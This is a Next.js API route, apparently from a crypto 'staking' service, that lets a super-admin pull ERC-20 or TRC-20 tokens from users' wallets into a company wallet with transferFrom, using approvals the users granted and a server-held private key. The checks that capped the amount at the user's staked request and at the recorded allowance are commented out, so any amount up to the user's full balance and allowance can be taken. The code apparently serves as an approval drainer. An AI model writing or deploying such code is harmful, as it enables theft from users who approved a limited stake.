import { NextResponse } from "next/server";
import {
  createPublicClient,
  createWalletClient,
  formatUnits,
  http,
  isAddress,
  parseUnits,
  type Address,
  type Chain,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import {
  arbitrum,
  avalanche,
  base,
  bsc,
  mainnet,
  optimism,
  polygon,
} from "viem/chains";
import { TronWeb } from "tronweb";
import { ERC20_ABI } from "@/lib/erc20";
import { prisma } from "@/lib/prisma";
import { getCurrentSession } from "@/lib/session";
import { LST_PRODUCTS } from "@/lib/staking-assets";
import { isSuperAdminSession } from "@/lib/super-admin";

export const runtime = "nodejs";

const EVM_CHAINS: Record<number, Chain> = {
  [mainnet.id]: mainnet,
  [optimism.id]: optimism,
  [bsc.id]: bsc,
  [polygon.id]: polygon,
  [arbitrum.id]: arbitrum,
  [avalanche.id]: avalanche,
  [base.id]: base,
};

const TRC20_ABI = [
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    constant: true,
    inputs: [
      { name: "_owner", type: "address" },
      { name: "_spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ name: "remaining", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    constant: false,
    inputs: [
      { name: "_from", type: "address" },
      { name: "_to", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ name: "success", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
] as const;

interface TronTrc20Contract {
  allowance: (
    owner: string,
    spender: string,
  ) => {
    call: () => Promise<unknown>;
  };
  balanceOf: (owner: string) => {
    call: () => Promise<unknown>;
  };
  transferFrom: (
    owner: string,
    receiver: string,
    amount: string,
  ) => {
    send: (options?: { feeLimit?: number }) => Promise<unknown>;
  };
}

export async function POST(request: Request) {
  const unauthorized = await requireSuperAdmin();
  if (unauthorized) return unauthorized;

  const payload = (await request.json().catch(() => null)) as
    | { id?: unknown; amount?: unknown }
    | null;
  const id = typeof payload?.id === "string" ? payload.id : "";
  const amount = typeof payload?.amount === "string" ? payload.amount.trim() : "";
  const amountNumber = Number(amount);

  if (!id) {
    return NextResponse.json({ error: "요청 ID가 필요합니다." }, { status: 400 });
  }
  if (!Number.isFinite(amountNumber) || amountNumber <= 0) {
    return NextResponse.json({ error: "회수 수량을 올바르게 입력해주세요." }, { status: 400 });
  }

  const [adminWallet, stakeRequest] = await Promise.all([
    prisma.adminWallet.findUnique({ where: { id: "default" } }),
    prisma.stakeRequest.findUnique({
      where: { id },
      include: {
        user: {
          select: {
            id: true,
            username: true,
            walletAddress: true,
            tronAddress: true,
          },
        },
      },
    }),
  ]);

  if (!adminWallet) {
    return NextResponse.json({ error: "회사 지갑이 등록되어 있지 않습니다." }, { status: 400 });
  }
  if (!stakeRequest) {
    return NextResponse.json({ error: "요청을 찾지 못했습니다." }, { status: 404 });
  }
  if (stakeRequest.status === "SETTLED" || stakeRequest.status === "REJECTED") {
    return NextResponse.json({ error: "회수할 수 없는 상태입니다." }, { status: 400 });
  }
  // if (amountNumber > stakeRequest.amountNumeric) {
  //   return NextResponse.json(
  //     { error: "회수 수량은 요청 수량보다 클 수 없습니다." },
  //     { status: 400 },
  //   );
  // }
  if (!stakeRequest.tokenAddress || stakeRequest.tokenDecimals === null) {
    return NextResponse.json(
      { error: "transferFrom 가능한 토큰 요청이 아닙니다." },
      { status: 400 },
    );
  }
  if (!stakeRequest.spenderAddress) {
    return NextResponse.json({ error: "승인 spender 주소가 없습니다." }, { status: 400 });
  }

  const amountUnits = parseUnits(amount, stakeRequest.tokenDecimals);
  // if (recordedAllowance !== null && recordedAllowance < amountUnits) {
  //   return NextResponse.json(
  //     { error: "기록된 allowance보다 회수 수량이 큽니다." },
  //     { status: 400 },
  //   );
  // }

  const product = LST_PRODUCTS.find(
    (item) =>
      item.network === stakeRequest.sourceNetwork &&
      item.sourceSymbol === stakeRequest.sourceSymbol &&
      item.receiptSymbol === stakeRequest.receiptSymbol,
  );

  try {
    const txHash = stakeRequest.tokenAddress.startsWith("0x")
      ? await recoverEvm({
          tokenAddress: stakeRequest.tokenAddress,
          owner: stakeRequest.walletAddress,
          spender: stakeRequest.spenderAddress,
          receiver: adminWallet.evmAddress,
          amountUnits,
          chainId: product?.approval?.chainId,
          decimals: stakeRequest.tokenDecimals,
          symbol: stakeRequest.sourceSymbol,
        })
      : await recoverTron({
          tokenAddress: stakeRequest.tokenAddress,
          owner: stakeRequest.tronAddress,
          spender: stakeRequest.spenderAddress,
          receiver: adminWallet.tronAddress,
          amountUnits,
          decimals: stakeRequest.tokenDecimals,
          symbol: stakeRequest.sourceSymbol,
        });

    const updated = await prisma.stakeRequest.update({
      where: { id },
      data: {
        status: "TRANSFERRED",
        transferTxHash: txHash,
        adminNote: `온체인 회수: ${amount} ${stakeRequest.sourceSymbol}`,
      },
      include: {
        user: {
          select: {
            id: true,
            username: true,
            walletAddress: true,
            tronAddress: true,
          },
        },
      },
    });

    return NextResponse.json({ request: updated, txHash });
  } catch (e) {
    return NextResponse.json(
      { error: e instanceof Error ? e.message : "온체인 회수 실패" },
      { status: 400 },
    );
  }
}

async function recoverEvm({
  tokenAddress,
  owner,
  spender,
  receiver,
  amountUnits,
  chainId,
  decimals,
  symbol,
}: {
  tokenAddress: string;
  owner: string | null;
  spender: string;
  receiver: string;
  amountUnits: bigint;
  chainId?: number;
  decimals: number;
  symbol: string;
}) {
  if (!owner || !isAddress(owner)) throw new Error("유저 EVM 주소가 없습니다.");
  if (!isAddress(spender)) throw new Error("spender EVM 주소가 올바르지 않습니다.");
  if (!isAddress(receiver)) throw new Error("회사 EVM 지갑 주소가 올바르지 않습니다.");

  const privateKey = normalizePrivateKey(process.env.ADMIN_EVM_PRIVATE_KEY);
  if (!privateKey) {
    throw new Error("서버에 ADMIN_EVM_PRIVATE_KEY가 설정되어 있지 않습니다.");
  }

  const account = privateKeyToAccount(privateKey);
  if (account.address.toLowerCase() !== spender.toLowerCase()) {
    throw new Error(
      `ADMIN_EVM_PRIVATE_KEY 주소(${account.address})가 승인 spender(${spender})와 다릅니다.`,
    );
  }

  const chain = EVM_CHAINS[chainId ?? mainnet.id] ?? mainnet;
  const transport = http(getEvmRpcUrl(chain.id));
  const publicClient = createPublicClient({ chain, transport });
  const [balance, allowance] = await Promise.all([
    publicClient.readContract({
      address: tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [owner as Address],
    }),
    publicClient.readContract({
      address: tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "allowance",
      args: [owner as Address, spender as Address],
    }),
  ]);

  if (balance < amountUnits) {
    throw new Error(
      `유저 잔고가 부족합니다. 현재 ${formatUnits(balance, decimals)} ${symbol}`,
    );
  }
  if (allowance < amountUnits) {
    throw new Error(
      `allowance가 부족합니다. 현재 ${formatUnits(allowance, decimals)} ${symbol}`,
    );
  }

  const walletClient = createWalletClient({ account, chain, transport });
  return await walletClient.writeContract({
    address: tokenAddress as Address,
    abi: ERC20_ABI,
    functionName: "transferFrom",
    args: [owner as Address, receiver as Address, amountUnits],
  });
}

async function recoverTron({
  tokenAddress,
  owner,
  spender,
  receiver,
  amountUnits,
  decimals,
  symbol,
}: {
  tokenAddress: string;
  owner: string | null;
  spender: string;
  receiver: string | null;
  amountUnits: bigint;
  decimals: number;
  symbol: string;
}) {
  if (!owner) throw new Error("유저 TRON 주소가 없습니다.");
  if (!receiver) throw new Error("회사 TRON 지갑 주소가 저장되어 있지 않습니다.");

  const privateKey = process.env.ADMIN_TRON_PRIVATE_KEY?.trim();
  if (!privateKey) {
    throw new Error("서버에 ADMIN_TRON_PRIVATE_KEY가 설정되어 있지 않습니다.");
  }

  const tronWeb = new TronWeb({
    fullHost: process.env.TRON_FULL_HOST ?? "https://api.trongrid.io",
    headers: process.env.TRONGRID_API_KEY
      ? { "TRON-PRO-API-KEY": process.env.TRONGRID_API_KEY }
      : undefined,
    privateKey,
  });
  const signerAddress = tronWeb.address.fromPrivateKey(privateKey);
  if (!signerAddress || !sameTronAddress(signerAddress, spender)) {
    throw new Error(
      `ADMIN_TRON_PRIVATE_KEY 주소(${signerAddress || "-"})가 승인 spender(${spender})와 다릅니다.`,
    );
  }
  if (!sameTronAddress(receiver, spender)) {
    throw new Error("저장된 회사 TRON 지갑이 승인 spender와 다릅니다.");
  }

  const contract = (await tronWeb.contract(
    TRC20_ABI,
    tokenAddress,
  )) as unknown as TronTrc20Contract;
  const [balanceResult, allowanceResult] = await Promise.all([
    contract.balanceOf(owner).call(),
    contract.allowance(owner, spender).call(),
  ]);
  const balance = unknownToBigInt(balanceResult);
  const allowance = unknownToBigInt(allowanceResult);

  if (balance < amountUnits) {
    throw new Error(
      `유저 잔고가 부족합니다. 현재 ${formatUnits(balance, decimals)} ${symbol}`,
    );
  }
  if (allowance < amountUnits) {
    throw new Error(
      `allowance가 부족합니다. 현재 ${formatUnits(allowance, decimals)} ${symbol}`,
    );
  }

  const tx = await contract.transferFrom(owner, receiver, amountUnits.toString()).send({
    feeLimit: 100_000_000,
  });
  return extractTxId(tx);
}

async function requireSuperAdmin() {
  const session = await getCurrentSession();
  if (!session) {
    return NextResponse.json({ error: "관리자 로그인이 필요합니다." }, { status: 401 });
  }
  if (!isSuperAdminSession(session)) {
    return NextResponse.json({ error: "슈퍼관리자 권한이 필요합니다." }, { status: 403 });
  }
  return null;
}

function normalizePrivateKey(value: string | undefined) {
  const trimmed = value?.trim();
  if (!trimmed) return null;
  return (trimmed.startsWith("0x") ? trimmed : `0x${trimmed}`) as `0x${string}`;
}

function getEvmRpcUrl(chainId: number) {
  return (
    process.env[`ADMIN_EVM_RPC_URL_${chainId}`] ??
    process.env.ADMIN_EVM_RPC_URL ??
    undefined
  );
}

function sameTronAddress(a: string | null | undefined, b: string | null | undefined) {
  return Boolean(a && b && a.trim() === b.trim());
}

function unknownToBigInt(value: unknown) {
  if (typeof value === "bigint") return value;
  if (typeof value === "number") return BigInt(value);
  if (typeof value === "string") return BigInt(value);
  if (value && typeof value === "object" && "toString" in value) {
    return BigInt(String(value));
  }
  throw new Error("토큰 수량을 해석하지 못했습니다.");
}

function extractTxId(value: unknown) {
  if (typeof value === "string") return value;
  if (value && typeof value === "object") {
    const record = value as Record<string, unknown>;
    if (typeof record.txid === "string") return record.txid;
    if (typeof record.transaction?.toString === "function") {
      return String(record.transaction);
    }
  }
  return String(value);
}
